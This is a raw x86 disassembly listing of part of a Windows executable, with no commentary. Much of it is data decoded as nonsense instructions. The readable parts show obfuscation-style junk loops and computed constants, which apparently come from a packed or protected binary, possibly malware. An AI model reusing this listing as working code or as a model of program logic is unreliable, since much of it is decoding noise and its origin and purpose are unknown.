  40e213:	(bad)  
  40e214:	push   0x46
  40e216:	int    0xc9
  40e218:	sbb    ch,BYTE PTR [edx-0x2360b854]
  40e21e:	imul   ecx,ebp,0xffffffc3
  40e221:	lea    ebx,[esi]
  40e223:	cmp    eax,0x3d5af93e
  40e228:	bound  esi,QWORD PTR [edx+edi*8-0x35]
  40e22c:	lock popf 
  40e22e:	fstp   TBYTE PTR [ebx]
  40e230:	mov    ds:0xe6841b3d,eax
  40e235:	and    dh,BYTE PTR [esp+ecx*4-0x75]
  40e239:	dec    edx
  40e23a:	aam    0xd3
  40e23c:	mov    ebp,DWORD PTR [ebp-0x79ce91d1]
  40e242:	mov    ecx,0xdfc688ec
  40e247:	imul   ebp,DWORD PTR [edi+0x4092ef31],0xffffffc6
  40e24e:	dec    edi
  40e24f:	imul   esp,DWORD PTR ds:0xaa37bf2f,0xfffffff8
  40e256:	clc    
  40e257:	push   ebp
  40e258:	adc    cl,BYTE PTR [esp+eax*4+0x75322b8c]
  40e25f:	xchg   esi,eax
  40e260:	mov    DWORD PTR [edx-0x11],ebx
  40e263:	sbb    DWORD PTR ds:0x7c3d5cfd,esp
  40e269:	mov    eax,ds:0xd12aa747
  40e26e:	add    eax,0xd50e8038
  40e273:	mov    cl,0x52
  40e275:	fs mov edi,0x1358a299
  40e27b:	jp     0x40e29e
  40e27d:	sbb    al,0x1b
  40e27f:	add    DWORD PTR [ecx+ecx*2-0x75c94363],eax
  40e286:	stc    
  40e287:	xchg   edi,eax
  40e288:	mov    BYTE PTR [ecx+0x68],ah
  40e28b:	lahf   
  40e28c:	pop    ds
  40e28d:	jb     0x40e238
  40e28f:	mov    bl,0x5b
  40e291:	jmp    0x21ccfc0
  40e296:	push   0xdf8fe264
  40e29b:	lds    esi,FWORD PTR [edx+0x59ec15bc]
  40e2a1:	(bad)  
  40e2a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2a3:	cdq    
  40e2a4:	push   edi
  40e2a5:	and    edx,DWORD PTR [ecx]
  40e2a7:	ins    BYTE PTR es:[edi],dx
  40e2a8:	arpl   WORD PTR [eax],di
  40e2aa:	icebp  
  40e2ab:	stos   DWORD PTR es:[edi],eax
  40e2ac:	scas   al,BYTE PTR es:[edi]
  40e2ad:	mov    al,ds:0x43865233
  40e2b2:	sbb    dh,BYTE PTR [ecx+0x1946d85a]
  40e2b8:	aas    
  40e2b9:	enter  0x475d,0xc
  40e2bd:	push   esp
  40e2be:	mov    dh,0x0
  40e2c0:	(bad)  
  40e2c1:	sbb    al,0x26
  40e2c3:	lds    ebx,FWORD PTR [edx+0x55a5b149]
  40e2c9:	mov    ds:0xd8b0c488,eax
  40e2ce:	sbb    eax,0xfbdc236d
  40e2d3:	bound  esp,QWORD PTR [esi-0x7267e996]
  40e2d9:	adc    DWORD PTR [edx-0x40],edi
  40e2dc:	lods   eax,DWORD PTR ds:[esi]
  40e2dd:	pop    esp
  40e2de:	out    dx,eax
  40e2df:	xchg   esp,eax
  40e2e0:	sbb    BYTE PTR [edx+0x53b25439],ch
  40e2e6:	xchg   ebx,eax
  40e2e7:	hlt    
  40e2e8:	fwait
  40e2e9:	stos   DWORD PTR es:[edi],eax
  40e2ea:	push   cs
  40e2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ec:	out    dx,al
  40e2ed:	dec    BYTE PTR [ecx]
  40e2ef:	cmp    al,0xf4
  40e2f1:	cmc    
  40e2f2:	mov    cl,0x1f
  40e2f4:	add    BYTE PTR [ebx-0x126058d8],al
  40e2fa:	add    edi,DWORD PTR [edx+0x41c6f98f]
  40e300:	scas   al,BYTE PTR es:[edi]
  40e301:	ss pop ebx
  40e303:	pop    ecx
  40e304:	xchg   ebp,eax
  40e305:	mov    DWORD PTR [ecx+0x28],0xbea7f0b2
  40e30c:	cmp    bh,BYTE PTR [ecx+edi*2+0x5599f6b0]
  40e313:	lds    ebx,FWORD PTR es:[ecx+0x19]
  40e317:	pop    es
  40e318:	std    
  40e319:	mov    ch,BYTE PTR [edi]
  40e31b:	ds enter 0x9ffe,0xda
  40e320:	push   ss
  40e321:	rol    DWORD PTR [ebx-0x465513b7],1
  40e327:	add    BYTE PTR [ecx+0x60],al
  40e32a:	out    dx,eax
  40e32b:	inc    ebx
  40e32c:	sbb    al,0x41
  40e32e:	mov    al,ds:0x7d31ab3d
  40e333:	dec    ebx
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	jmp    ebx
  40e3c0:	xor    bh,BYTE PTR [esi]
  40e3c2:	inc    edx
  40e3c3:	aas    
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e38e
  40e3cc:	ds adc eax,0xc3c0c657
  40e3d2:	mov    ch,0x81
  40e3d4:	dec    ebp
  40e3d5:	xor    al,BYTE PTR [ebx+ecx*2+0x72eeb3e2]
  40e3dc:	sub    ah,BYTE PTR [ebp-0x41]
  40e3df:	mov    ds:0x26d8acd2,eax
  40e3e4:	or     eax,0x6549102b
  40e3e9:	xchg   al,al
  40e3eb:	imul   eax,DWORD PTR [eax],0x1c298a8c
  40e3f1:	lds    ecx,FWORD PTR [ebp+0x72]
  40e3f4:	fcomp  DWORD PTR [ecx+0x20ea7e36]
  40e3fa:	push   ebx
  40e3fb:	xchg   ebx,eax
  40e3fc:	gs jnp 0x40e418
  40e3ff:	lea    eax,[esi-0x74012e2f]
  40e405:	push   0x497f8e8b
  40e40a:	push   ebp
  40e40b:	jl     0x40e476
  40e40d:	nop
  40e40e:	and    DWORD PTR [edx-0x31],ecx
  40e411:	stos   BYTE PTR es:[edi],al
  40e412:	mov    edi,0xbea33462
  40e417:	dec    esi
  40e418:	popa   
  40e419:	cmp    eax,0xe0c1bd2f
  40e41e:	addr16 das 
  40e420:	in     al,dx
  40e421:	add    BYTE PTR [edi+0x9],0xe8
  40e425:	adc    ebp,DWORD PTR ds:[esi]
  40e428:	mov    al,0x6e
  40e42a:	das    
  40e42b:	aaa    
  40e42c:	add    al,0xeb
  40e42e:	xor    dh,BYTE PTR [ebp-0x54]
  40e431:	mov    dl,BYTE PTR [esi-0x724c75ff]
  40e437:	jne    0x40e478
  40e439:	dec    edi
  40e43a:	es xchg ecx,eax
  40e43c:	mov    dl,0x1e
  40e43e:	sub    bl,BYTE PTR [ebx+0x3af7c337]
  40e444:	push   0x35
  40e446:	jp     0x40e3fa
  40e448:	test   eax,0x37326de5
  40e44d:	jecxz  0x40e400
  40e44f:	dec    ebp
  40e450:	ret    
  40e451:	pop    ebx
  40e452:	push   ebp
  40e453:	(bad)  
  40e454:	sub    bh,bh
  40e456:	mov    DWORD PTR [ecx-0x4e],ecx
  40e459:	xchg   edx,eax
  40e45a:	cld    
  40e45b:	retf   0x81fb
  40e45e:	dec    edx
  40e45f:	and    bh,BYTE PTR ds:0xb9b2dec6
  40e465:	mov    WORD PTR [edi+ecx*2+0x4],es
  40e469:	aas    
  40e46a:	mov    BYTE PTR [ecx+eax*2+0x3e68bb6e],ah
  40e471:	call   DWORD PTR [esi]
  40e473:	out    dx,al
  40e474:	mov    cl,0x17
  40e476:	pusha  
  40e477:	sub    edx,esi
  40e479:	or     eax,0xac54334b
  40e47e:	in     eax,0x91
  40e480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e481:	xor    dl,ch
  40e483:	mov    ds:0xf96d5efe,eax
  40e488:	or     edx,DWORD PTR [esi]
  40e48a:	and    eax,0xb36a1025
  40e48f:	rol    BYTE PTR [ebx-0x15],cl
  40e492:	(bad)  
  40e493:	adc    DWORD PTR [esi+0x48],eax
  40e496:	scas   eax,DWORD PTR es:[edi]
  40e497:	out    0x13,eax
  40e499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e49a:	mov    cl,BYTE PTR [edx]
  40e49c:	mov    ?,ebx
  40e49e:	push   0xffffff8b
  40e4a0:	push   esi
  40e4a1:	aam    0x3f
  40e4a3:	and    dh,ch
  40e4a5:	and    al,0x3b
  40e4a7:	sbb    BYTE PTR [esi+0x2d],bl
  40e4aa:	xor    al,0x81
  40e4ac:	or     DWORD PTR [edx-0x62786d33],ebp
  40e4b2:	xlat   BYTE PTR ds:[ebx]
  40e4b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4b4:	push   eax
  40e4b5:	(bad)  
  40e4b6:	xor    eax,0xfd8274ac
  40e4bb:	adc    dh,dl
  40e4bd:	shl    BYTE PTR [ebp-0x4e],0xb6
  40e4c1:	add    eax,0xa9f04602
  40e4c6:	out    dx,eax
  40e4c7:	imul   edi,DWORD PTR [edx+0x5b],0x1e
  40e4cb:	and    BYTE PTR [ebx-0x65d6dfe8],ch
  40e4d1:	mov    ds:0xeabcfaa3,eax
  40e4d6:	push   ecx
  40e4d7:	std    
  40e4d8:	or     al,0x75
  40e4da:	mov    eax,ds:0x1fa840f
  40e4df:	add    BYTE PTR [eax],al
  40e4e1:	add    DWORD PTR ds:0x433833,0x32bd
  40e4eb:	mov    eax,DWORD PTR [ebp-0x4]
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0xf27d9328
  40e5c1:	int    0x8
  40e5c3:	iret   
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e55e
  40e5cc:	inc    edx
  40e5cd:	stos   DWORD PTR es:[edi],eax
  40e5ce:	xchg   DWORD PTR [eax],ebp
  40e5d0:	nop
  40e5d1:	in     ax,0xed
  40e5d4:	inc    ebx
  40e5d5:	dec    ebp
  40e5d6:	(bad)  
  40e5d8:	pop    ss
  40e5d9:	xchg   edi,eax
  40e5db:	mov    eax,ds:0xa148cf95
  40e5e0:	adc    BYTE PTR [eax+0x55],dh
  40e5e3:	mov    ah,0x12
  40e5e5:	inc    edi
  40e5e6:	pop    edi
  40e5e7:	pusha  
  40e5e8:	xchg   ebx,eax
  40e5e9:	fnstenv [edx+0x3e]
  40e5ec:	xor    BYTE PTR [ebx+0x62],bh
  40e5ef:	retf   0xf0b7
  40e5f2:	mov    dl,0xd2
  40e5f4:	adc    BYTE PTR fs:[esi-0x4e8f820b],dl
  40e5fb:	rcl    al,0x52
  40e5fe:	into   
  40e5ff:	dec    esp
  40e600:	shl    ebx,1
  40e602:	pop    ds
  40e603:	pop    ecx
  40e604:	outs   dx,BYTE PTR ds:[esi]
  40e605:	dec    esp
  40e606:	mov    dl,0x7f
  40e608:	(bad)  
  40e609:	out    dx,eax
  40e60a:	xchg   ebp,eax
  40e60b:	inc    edi
  40e60c:	test   al,0x99
  40e60e:	sub    BYTE PTR gs:0xa8dbfd72,al
  40e615:	shr    BYTE PTR [esp+ecx*4-0x4c],1
  40e619:	inc    eax
  40e61a:	xor    eax,0x13cb1991
  40e61f:	imul   eax,DWORD PTR [eax],0xffffffca
  40e622:	cwde   
  40e623:	loopne 0x40e68d
  40e625:	shl    bl,1
  40e627:	jns    0x40e68f
  40e629:	stc    
  40e62a:	inc    eax
  40e62b:	fwait
  40e62c:	dec    edi
  40e62d:	rcl    BYTE PTR [ebx+0x3c],0xa
  40e631:	ins    BYTE PTR es:[edi],dx
  40e632:	cmp    BYTE PTR [eax+edx*4+0x60],0x44
  40e637:	push   ecx
  40e638:	call   0xf99bbfb4
  40e63d:	out    0x6d,eax
  40e63f:	pop    ebp
  40e640:	ja     0x40e658
  40e642:	fldcw  WORD PTR ds:0xc9cba106
  40e648:	jae    0x40e63c
  40e64a:	adc    eax,0xa6a4c784
  40e64f:	cwde   
  40e650:	jns    0x40e66f
  40e652:	mov    dh,BYTE PTR [eax+0x4d3628ac]
  40e658:	add    eax,DWORD PTR [eax+0x5d87b645]
  40e65e:	jo     0x40e661
  40e660:	fs lahf 
  40e662:	jmp    0xe8a:0x95aa1e75
  40e669:	dec    esp
  40e66a:	into   
  40e66b:	dec    ecx
  40e66c:	repnz push ebx
  40e66e:	or     BYTE PTR [ecx],0x22
  40e671:	sbb    al,0x66
  40e673:	outs   dx,DWORD PTR ds:[esi]
  40e674:	push   0xcc45e0dd
  40e679:	out    dx,eax
  40e67a:	ret    
  40e67b:	call   0x2357:0xb110a172
  40e682:	fs iret 
  40e684:	add    eax,0xe213a21c
  40e689:	cmp    bh,BYTE PTR [esi+0x5a]
  40e68c:	retf   0xe924
  40e68f:	inc    ecx
  40e690:	or     BYTE PTR [esi+0x47],bl
  40e693:	mov    ah,0x43
  40e695:	leave  
  40e696:	jle    0x40e6db
  40e698:	xchg   esp,eax
  40e699:	mov    cl,BYTE PTR [ebx-0x77]
  40e69c:	add    BYTE PTR [ecx-0x789934d1],bh
  40e6a2:	or     ebx,DWORD PTR [ebx-0x7]
  40e6a5:	ins    BYTE PTR es:[edi],dx
  40e6a6:	imul   ecx,ecx,0x7d
  40e6a9:	push   cs
  40e6aa:	rol    DWORD PTR [ebx+0x38e99b95],0x1e
  40e6b1:	popa   
  40e6b2:	enter  0x583c,0x55
  40e6b6:	clc    
  40e6b7:	int    0x14
  40e6b9:	push   esp
  40e6ba:	icebp  
  40e6bb:	cmp    dl,dh
  40e6bd:	(bad)  
  40e6be:	repnz and al,0x87
  40e6c1:	stc    
  40e6c2:	lods   eax,DWORD PTR ds:[esi]
  40e6c3:	mov    dh,BYTE PTR [edx+0x4b01d33a]
  40e6c9:	fxch   st(0)
  40e6cb:	stos   BYTE PTR es:[edi],al
  40e6cc:	mov    bh,0x19
  40e6ce:	ins    DWORD PTR es:[edi],dx
  40e6cf:	test   al,0x20
  40e6d1:	cld    
  40e6d2:	(bad)  
  40e6d3:	cmc    
  40e6d4:	pop    esi
  40e6d5:	or     bl,BYTE PTR [edi]
  40e6d7:	jbe    0x40e698
  40e6d9:	pop    esp
  40e6da:	lock mov eax,DWORD PTR [ebp-0x4]
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x22630a1
  40e707:	sbb    BYTE PTR ds:0x7e7ea2df,cl
  40e70d:	push   cs
  40e70e:	jg     0x40e78e
  40e710:	jle    0x40e77f
  40e712:	mov    eax,0x6470c397
  40e717:	mov    ah,0xd4
  40e719:	dec    ecx
  40e71a:	hlt    
  40e71b:	xor    bl,BYTE PTR [edi+0x59]
  40e71e:	gs inc esp
  40e720:	jbe    0x40e732
  40e722:	sbb    ebx,0x5710a148
  40e728:	arpl   sp,bp
  40e72a:	pop    ss
  40e72b:	fsubr  DWORD PTR [ebp+0x68]
  40e72e:	mov    DWORD PTR [eax+eax*2-0x69],ebx
  40e732:	and    DWORD PTR [edx+0x3f],0x4098bdeb
  40e739:	(bad)  
  40e73a:	push   cs
  40e73b:	jne    0x40e7b2
  40e73d:	xchg   esp,eax
  40e73e:	test   DWORD PTR [ebp-0x3b],0x49fdce1c
  40e745:	push   ebx
  40e746:	dec    esi
  40e747:	ret    0xad77
  40e74a:	aaa    
  40e74b:	sbb    edx,esi
  40e74d:	xchg   edx,eax
  40e74e:	and    al,0x2d
  40e750:	stc    
  40e751:	sar    DWORD PTR [ecx-0x72],cl
  40e754:	addr16 and al,0xfb
  40e757:	fidivr DWORD PTR es:[edx+0x52611c01]
  40e75e:	jns    0x40e727
  40e760:	aad    0xd9
  40e762:	out    0x3f,al
  40e764:	mov    bh,0xbc
  40e766:	test   al,0x83
  40e768:	jno    0x40e704
  40e76a:	test   eax,0x34d288e4
  40e76f:	aam    0xca
  40e771:	in     eax,0xbd
  40e773:	cmp    esi,DWORD PTR [eax+0x7a]
  40e776:	pushf  
  40e777:	push   ds
  40e778:	mov    ecx,0xed306b55
  40e77d:	jl     0x40e7a9
  40e77f:	mov    esi,0x317ecea3
  40e784:	and    DWORD PTR [ebx-0x6],ebp
  40e787:	xchg   ebp,eax
  40e788:	fnstcw WORD PTR [esi+0x1aef6efa]
  40e78e:	scas   eax,DWORD PTR es:[edi]
  40e78f:	push   eax
  40e790:	pop    ds
  40e791:	fisttp QWORD PTR [ecx+edx*1+0x42]
  40e795:	pop    ss
  40e796:	clc    
  40e797:	cmp    esp,DWORD PTR [ebp+0x2d57ddc2]
  40e79d:	out    dx,eax
  40e79e:	popa   
  40e79f:	and    eax,0x20922004
  40e7a4:	aam    0x83
  40e7a6:	push   ds
  40e7a7:	data16 jo 0x40e76c
  40e7aa:	cld    
  40e7ab:	or     BYTE PTR fs:[eax],0x1e
  40e7af:	pushf  
  40e7b0:	or     cl,al
  40e7b2:	jae    0x40e771
  40e7b4:	fst    QWORD PTR [ecx+edi*4]
  40e7b7:	push   ecx
  40e7b8:	gs jo  0x40e797
  40e7bb:	cmp    eax,0xfadbc75e
  40e7c0:	push   esi
  40e7c1:	inc    edx
  40e7c2:	inc    DWORD PTR [edi-0x52]
  40e7c5:	mov    ah,0xbd
  40e7c7:	jp     0x40e7e3
  40e7c9:	and    DWORD PTR [edx-0x1e5482e1],ebp
  40e7cf:	xor    al,0x8d
  40e7d1:	add    BYTE PTR [eax-0x6d],0x63
  40e7d5:	cmp    eax,ecx
  40e7d7:	inc    esp
  40e7d8:	dec    ecx
  40e7d9:	mov    al,0x9
  40e7db:	cld    
  40e7dc:	cmc    
  40e7dd:	mov    ds:0xeedaf058,al
  40e7e2:	int    0x25
  40e7e4:	mov    ebx,0x1ae090dd
  40e7e9:	inc    edi
  40e7ea:	in     al,0x33
  40e7ec:	sbb    BYTE PTR [eax+esi*2+0x6d1011d2],dl
  40e7f3:	cwde   
  40e7f4:	ja     0x40e78e
  40e7f6:	repz pop esi
  40e7f8:	jb     0x40e7d3
  40e7fa:	dec    eax
  40e7fb:	loopne 0x40e7ac
  40e7fd:	aaa    
  40e7fe:	arpl   WORD PTR [esi+0x3a6aa14d],bx
  40e804:	test   eax,0x8dd52968
  40e809:	arpl   WORD PTR [ebx+edx*1-0x5f988ccc],di
  40e810:	inc    ebp
  40e811:	(bad)
  40e815:	sub    DWORD PTR [eax+0x2609de0],0x7f
  40e81c:	loop   0x40e84c
  40e81e:	add    eax,0x62a3e816
  40e823:	cmp    al,0x41
  40e825:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x91103a68,al
  40ea30:	push   cs
  40ea31:	and    esi,DWORD PTR ds:0x7e7ea3ef
  40ea37:	push   cs
  40ea38:	jl     0x40eab8
  40ea3a:	jle    0x40ea5f
  40ea3c:	ds or  ebx,esp
  40ea3f:	jl     0x40e9d9
  40ea41:	not    DWORD PTR [ecx-0x70]
  40ea44:	sbb    ah,BYTE PTR [ebx-0x39]
  40ea47:	retf   
  40ea48:	mov    dh,0xc9
  40ea4a:	mov    al,cl
  40ea4c:	sub    DWORD PTR [ebx+0x77baad03],0x56
  40ea53:	(bad)  
  40ea54:	gs out 0x29,al
  40ea57:	addr16 cmc 
  40ea59:	retf   
  40ea5a:	mov    DWORD PTR [ebp-0x3eb76c98],ebx
  40ea60:	stos   DWORD PTR es:[edi],eax
  40ea61:	cli    
  40ea62:	retf   0x3ce7
  40ea65:	sub    WORD PTR [edx+esi*2],di
  40ea69:	fadd   DWORD PTR [edx-0x39f8df03]
  40ea6f:	jb     0x40ea29
  40ea71:	sti    
  40ea72:	push   ebp
  40ea73:	repnz sbb cl,0x49
  40ea77:	aam    0x3e
  40ea79:	nop
  40ea7a:	mov    ecx,0x4937dce8
  40ea7f:	mov    eax,0xb0e0d120
  40ea84:	daa    
  40ea85:	fcmovb st,st(4)
  40ea87:	jno    0x40ea12
  40ea89:	sub    esi,ebx
  40ea8b:	test   BYTE PTR [edi-0x9247d18],0x5
  40ea92:	aad    0xd7
  40ea94:	xor    esp,DWORD PTR [esi-0x6c]
  40ea97:	and    al,0xaf
  40ea99:	mov    ch,BYTE PTR [ebp+0x762f7d78]
  40ea9f:	jns    0x40ea5d
  40eaa1:	mov    eax,0x75ea69c2
  40eaa6:	mov    ch,dh
  40eaa8:	xlat   BYTE PTR ds:[ebx]
  40eaa9:	jo     0x40eafa
  40eaab:	inc    esi
  40eaac:	sub    DWORD PTR [ecx+0x161a81b],edx
  40eab2:	adc    eax,0xe4957448
  40eab7:	add    eax,0x626d290a
  40eabc:	nop
  40eabd:	or     eax,0x47d9721a
  40eac2:	rcr    esp,0x0
  40eac5:	xchg   DWORD PTR [ebx+0x7],esp
  40eac8:	in     eax,0x2f
  40eaca:	xor    DWORD PTR [edx],edi
  40eacc:	pop    esp
  40eacd:	push   0x5bdab985
  40ead2:	push   eax
  40ead3:	mov    dl,0xad
  40ead5:	push   ds
  40ead6:	test   al,dh
  40ead8:	mov    ch,0x5c
  40eada:	out    dx,eax
  40eadb:	ins    BYTE PTR es:[edi],dx
  40eadc:	mov    ecx,0xc573b9ff
  40eae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae2:	ret    
  40eae3:	mov    eax,0xaffada28
  40eae8:	ja     0x40eb46
  40eaea:	adc    DWORD PTR [ecx-0x38],edi
  40eaed:	fs push eax
  40eaef:	adc    DWORD PTR ds:0x639c6cf2,ebx
  40eaf5:	mov    bl,cl
  40eaf7:	inc    eax
  40eaf8:	int    0x31
